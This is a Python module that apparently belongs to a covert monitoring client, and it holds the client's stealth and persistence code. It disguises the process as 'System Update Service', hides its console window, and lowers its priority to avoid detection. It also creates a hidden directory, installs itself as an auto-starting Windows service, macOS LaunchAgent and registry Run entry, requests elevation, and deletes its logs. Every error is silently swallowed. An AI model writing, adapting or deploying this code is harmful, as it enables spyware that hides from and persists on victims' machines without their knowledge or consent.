# Stealth utilities for hiding the monitoring application

import os
import sys
import platform
import subprocess

# Conditional import for Windows registry
try:
    if platform.system() == 'Windows':
        import winreg
    else:
        winreg = None
except ImportError:
    winreg = None

class StealthMode:
    def __init__(self):
        self.system = platform.system()
        self.process_name = "System Update Service"
        
    def enable_stealth(self):
        """Enable maximum stealth mode"""
        try:
            # Set process name to look like system service
            self._disguise_process()
            
            # Disable console window on Windows
            if self.system == 'Windows':
                self._hide_console_window()
            
            # Set low priority to avoid detection
            self._set_low_priority()
            
        except Exception:
            pass  # Silent failure
    
    def _disguise_process(self):
        """Disguise the process name"""
        try:
            if self.system == 'Windows':
                import ctypes
                ctypes.windll.kernel32.SetConsoleTitleW(self.process_name)
        except:
            pass
    
    def _hide_console_window(self):
        """Hide console window on Windows"""
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    def _set_low_priority(self):
        """Set process priority to low to avoid detection"""
        try:
            import psutil
            process = psutil.Process()
            if self.system == 'Windows':
                process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
            else:
                process.nice(19)  # Lowest priority on Unix
        except:
            pass

class StealthManager:
    def __init__(self):
        self.system = platform.system()
        self.hidden_dir = self.get_hidden_directory()
        
    def get_hidden_directory(self):
        """Get or create hidden directory"""
        if self.system == 'Windows':
            hidden_dir = os.path.join(os.getenv('APPDATA'), '.system_cache')
        else:
            hidden_dir = os.path.join(os.path.expanduser('~'), '.system_cache')
            
        os.makedirs(hidden_dir, exist_ok=True)
        
        # Set hidden attribute on Windows
        if self.system == 'Windows':
            try:
                import ctypes
                ctypes.windll.kernel32.SetFileAttributesW(hidden_dir, 2)
            except Exception:
                pass
                
        return hidden_dir
        
    def hide_process(self):
        """Hide the current process"""
        try:
            if self.system == 'Windows':
                self.hide_process_windows()
            elif self.system == 'Darwin':
                self.hide_process_macos()
        except Exception:
            pass
            
    def hide_process_windows(self):
        """Hide process on Windows"""
        try:
            # Change process name in task manager (limited effectiveness)
            import ctypes
            from ctypes import wintypes
            
            # Try to change process description
            kernel32 = ctypes.windll.kernel32
            handle = kernel32.GetCurrentProcess()
            
            # This is a simplified approach - full stealth requires more advanced techniques
            
        except Exception:
            pass
            
    def hide_process_macos(self):
        """Hide process on macOS"""
        try:
            # Hide from Activity Monitor (limited effectiveness)
            # Full stealth on macOS requires different approaches
            pass
        except Exception:
            pass
            
    def install_as_service(self):
        """Install client as system service"""
        try:
            if self.system == 'Windows':
                self.install_windows_service()
            elif self.system == 'Darwin':
                self.install_macos_service()
        except Exception:
            pass
            
    def install_windows_service(self):
        """Install as Windows service"""
        try:
            # Create service using sc command
            service_name = "SystemUpdateService"
            service_display = "System Update Service"
            exe_path = sys.executable
            script_path = os.path.abspath(__file__)
            
            # Service installation command
            install_cmd = [
                'sc', 'create', service_name,
                'binPath=', f'"{exe_path}" "{script_path}"',
                'start=', 'auto',
                'DisplayName=', service_display
            ]
            
            # Run with admin privileges (if available)
            result = subprocess.run(install_cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                # Start the service
                subprocess.run(['sc', 'start', service_name], capture_output=True)
            
        except Exception:
            pass
            
    def install_macos_service(self):
        """Install as macOS Launch Agent"""
        try:
            # Create Launch Agent plist
            agent_name = "com.system.update.agent"
            plist_path = os.path.expanduser(f"~/Library/LaunchAgents/{agent_name}.plist")
            
            exe_path = sys.executable
            script_path = os.path.abspath(__file__)
            
            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{agent_name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{exe_path}</string>
        <string>{script_path}</string>
    </array>
    <key>StartInterval</key>
    <integer>30</integer>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
</dict>
</plist>'''
            
            # Write plist file
            with open(plist_path, 'w') as f:
                f.write(plist_content)
                
            # Load the agent
            subprocess.run(['launchctl', 'load', plist_path], capture_output=True)
            
        except Exception:
            pass
            
    def add_to_startup(self):
        """Add to system startup"""
        try:
            if self.system == 'Windows':
                self.add_to_windows_startup()
            elif self.system == 'Darwin':
                self.add_to_macos_startup()
        except Exception:
            pass
            
    def add_to_windows_startup(self):
        """Add to Windows startup registry"""
        try:
            if winreg:
                key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
                
                exe_path = sys.executable
                script_path = os.path.abspath(__file__)
                command = f'"{exe_path}" "{script_path}"'
                
                winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, command)
                winreg.CloseKey(key)
                
        except Exception:
            pass
            
    def add_to_macos_startup(self):
        """Add to macOS login items (simplified)"""
        try:
            # This would typically use LaunchAgents (already implemented above)
            # or Login Items through AppleScript
            pass
        except Exception:
            pass
            
    def is_admin(self):
        """Check if running with admin/root privileges"""
        try:
            if self.system == 'Windows':
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin()
            else:
                return os.getuid() == 0
        except Exception:
            return False
            
    def elevate_privileges(self):
        """Request admin privileges"""
        try:
            if self.system == 'Windows' and not self.is_admin():
                # Re-run script with admin privileges
                import ctypes
                script = os.path.abspath(sys.argv[0])
                params = ' '.join(sys.argv[1:])
                
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, f'"{script}" {params}', None, 1
                )
                sys.exit()
        except Exception:
            pass
            
    def cleanup_traces(self):
        """Clean up installation traces"""
        try:
            # Clear temporary files
            temp_files = [
                os.path.join(self.hidden_dir, '*.tmp'),
                os.path.join(self.hidden_dir, '*.log')
            ]
            
            import glob
            for pattern in temp_files:
                for file_path in glob.glob(pattern):
                    try:
                        os.remove(file_path)
                    except Exception:
                        pass
                        
        except Exception:
            pass
            
    def uninstall(self):
        """Uninstall the monitoring client"""
        try:
            # Stop all processes
            # Remove from startup
            if self.system == 'Windows':
                self.remove_from_windows_startup()
                self.remove_windows_service()
            elif self.system == 'Darwin':
                self.remove_macos_service()
                
            # Remove files
            import shutil
            if os.path.exists(self.hidden_dir):
                shutil.rmtree(self.hidden_dir)
            
        except Exception:
            pass
            
    def remove_from_windows_startup(self):
        """Remove from Windows startup"""
        try:
            if winreg:
                key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
                winreg.DeleteValue(key, "SystemUpdate")
                winreg.CloseKey(key)
        except Exception:
            pass
            
    def remove_windows_service(self):
        """Remove Windows service"""
        try:
            service_name = "SystemUpdateService"
            subprocess.run(['sc', 'stop', service_name], capture_output=True)
            subprocess.run(['sc', 'delete', service_name], capture_output=True)
        except Exception:
            pass
            
    def remove_macos_service(self):
        """Remove macOS Launch Agent"""
        try:
            agent_name = "com.system.update.agent"
            plist_path = os.path.expanduser(f"~/Library/LaunchAgents/{agent_name}.plist")
            
            subprocess.run(['launchctl', 'unload', plist_path], capture_output=True)
            if os.path.exists(plist_path):
                os.remove(plist_path)
        except Exception:
            pass
    
    def enable_stealth_mode(self):
        """Enable stealth mode - wrapper for hide_process"""
        try:
            self.hide_process()
        except Exception:
            pass
    
    def disable_stealth_mode(self):
        """Disable stealth mode - wrapper for cleanup"""
        try:
            self.cleanup_traces()
        except Exception:
            pass
